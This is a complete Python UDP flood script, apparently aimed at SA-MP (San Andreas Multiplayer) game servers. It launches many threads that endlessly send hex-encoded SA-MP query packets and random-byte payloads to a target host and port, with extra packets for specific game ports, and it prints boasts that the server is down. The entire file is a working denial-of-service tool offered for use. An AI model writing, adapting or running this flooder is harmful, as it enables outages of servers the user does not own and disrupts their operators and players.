import socket, struct, codecs, sys, threading, random, time, os

Attack = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

host = str(sys.argv[1])
port = int(sys.argv[2])
threads = int(sys.argv[3])

os.system('cls' if os.name == 'nt' else 'clear')
sys.stdout.write("\x1b]2;[@] SampAttack. | Attacked Sent To {}:{}\x07".format(host, port))
print(f"[ TOK !!.. TOK !!.. TOK!!.. ] Packets From Bimzzx To Server {host}:{port}")
time.sleep(1)
print(f"[ TOK !!.. TOK !!.. TOK!!.. ] Packets From Bimzzx To Server {host}:{port}")
time.sleep(1)
print(f"[ TOK !!.. TOK !!.. TOK!!.. ] Packets From Bimzzx To Server {host}:{port}")
time.sleep(1)
print(f"[ Connection Timeout | Server Maintenace / Down !! ]")

class Bimzzx(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = Attack[random.randrange(0, 3)]
            packet = random._urandom(1490)
            packets = random._urandom(1024)
            sock.sendto(msg, (host, int(port)))
            sock.sendto(packet, (host, int(port)))
            sock.sendto(packets, (host, int(port)))
            if int(port) == 7777:
                sock.sendto(Attack[5], (host, int(port)))
            elif int(port) == 7796:
                sock.sendto(Attack[4], (host, int(port)))
            elif int(port) == 7771:
                sock.sendto(Attack[6], (host, int(port)))
            elif int(port) == 7784:
                sock.sendto(Attack[7], (host, int(port)))

if __name__ == '__main__':
    try:
        for x in range(threads):
            extrash = Bimzzx()
            extrash.start()
            time.sleep(0.1)
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("╔════════════════════════════════════╗")
        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
        print ("╚════════════════════════════════════╝")
        pass